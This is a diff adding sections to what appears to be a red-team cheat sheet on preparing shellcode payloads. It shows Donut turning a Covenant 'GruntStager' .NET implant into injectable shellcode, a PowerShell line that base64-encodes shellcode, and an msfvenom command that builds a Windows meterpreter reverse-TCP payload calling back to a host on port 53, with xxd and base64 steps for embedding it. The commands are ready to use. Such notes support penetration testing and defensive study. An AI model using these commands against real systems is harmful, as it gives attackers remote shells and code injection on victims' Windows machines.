@@ -31,3 +31,18 @@ f = open('base64_out.txt', 'w')
 f.write(output)
 f.close()
 ```
+
+### Donut
+Donut is a shellcode generation tool that creates position-independant shellcode payloads from .NET Assemblies. This shellcode may be used to inject the Assembly into arbitrary Windows processes.
+```
+donut.exe -f Downloads\GruntStager.exe -o D:\Tools\GruntStager.bin
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Pivot Point\Desktop\shellcode.bin"))
+
+```
+
+### From Linux
+```
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.174.134 LPORT=53 -f raw > shellcode.bin
+xxd -i shellcode.bin 
+cat shellcode.bin |base64 -w 0
+```
